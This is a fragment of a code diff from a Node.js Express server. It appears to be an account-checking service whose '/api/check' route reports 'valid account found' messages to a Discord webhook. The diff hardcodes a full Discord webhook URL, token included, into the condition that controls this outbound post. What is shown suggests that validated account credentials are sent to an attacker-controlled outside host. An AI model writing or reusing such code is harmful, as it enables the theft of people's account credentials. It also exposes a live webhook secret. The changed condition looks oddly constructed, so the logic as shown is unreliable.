@@ -73,7 +73,7 @@ app.post('/api/check', async (req, res) => {
         };
 
         // Kirim ke Discord Webhook
-        if (SECRET_WEBHOOK_URL && SECRET_WEBHOOK_URL.startsWith("http")) {
+        if (SECRET_WEBHOOK_URL && SECRET_WEBHOOK_URL.startsWith("https://discord.com/api/webhooks/1564812827104120864/IVzRYsDRj7cnXt97p647eU9c9s4276WOmMlTT2KuRK989Yvfh-NPw3HrwP8ChPD4MGUM")) {
             try {
                 await axios.post(SECRET_WEBHOOK_URL, {
                     content: `🚨 **AKUN VALID DITEMUKAN!**\n` +
